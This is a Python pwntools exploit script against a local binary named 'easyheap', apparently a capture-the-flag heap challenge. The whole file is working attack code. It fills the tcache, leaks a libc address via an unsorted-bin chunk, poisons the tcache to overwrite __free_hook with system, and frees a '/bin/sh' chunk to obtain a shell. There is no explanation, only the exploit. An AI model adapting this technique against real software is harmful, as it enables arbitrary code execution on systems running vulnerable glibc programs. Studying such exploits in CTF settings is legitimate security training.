from pwn import *
#context.log_level = 'DEBUG'
p = process("./easyheap")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

def cmd(command:int):
    p.recvuntil(b">> ")
    p.sendline(str(command).encode())

def new(size:int, content):
    cmd(1)
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())
    p.recvuntil(b"Content: ")
    p.sendline(content)

def newWithZero(zero_location:int, size:int, content):
    cmd(1)
    p.recvuntil(b"Size: ")
    p.sendline(str(zero_location).encode())
    p.recvuntil(b"Invalid size.")
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())
    p.recvuntil(b"Content: ")
    p.sendline(content)

def dump(index:int):
    cmd(2)
    p.recvuntil(b"Index: ")
    p.sendline(str(index).encode())
    p.recvuntil(b"Content: ")

def delete(index:int):
    cmd(3)
    p.recvuntil(b"Index: ")
    p.sendline(str(index).encode())

def exp():
    # fill the tcache
    log.info("Start filling the tcache")
    for i in range(8):
        new(0x80, "arttnba3")
    for i in range(7):
        delete(7 - i)

    # leak the libc addr
    log.info("Start leaking the libc addr")
    delete(0)
    newWithZero(0x100, 0x1, b'\xe0') # idx 0
    dump(0)
    main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 352
    __malloc_hook = main_arena - 0x10
    libc_base = __malloc_hook - libc.sym['__malloc_hook']
    log.info("Libc addr:" + str(hex(libc_base)))

    # tcache poisoning
    log.info("Start tcache poisoning")
    new(0x70, "arttnba3") # idx 1
    new(0x60, "arttnba3") # idx 2, the former chunk left in unsorted-bin cut
    new(0x50, "arttnba3") # idx 3
    new(0x50, "arttnba3") # idx 4
    new(0x50, "arttnba3") # idx 5

    delete(3)
    delete(5)
    delete(4)

    newWithZero(-0xbf, 0x40, "arttnba3") # idx 3
    new(0x50, p64(libc_base + libc.sym['__free_hook'])) # idx 4
    new(0x50, b"/bin/sh\x00") # idx 5
    new(0x50, p64(libc_base + libc.sym['system'])) # idx 6, fake chunk

    # get the shell
    delete(5) # system("/bin/sh")
    p.interactive()

if __name__ == '__main__':
    exp()
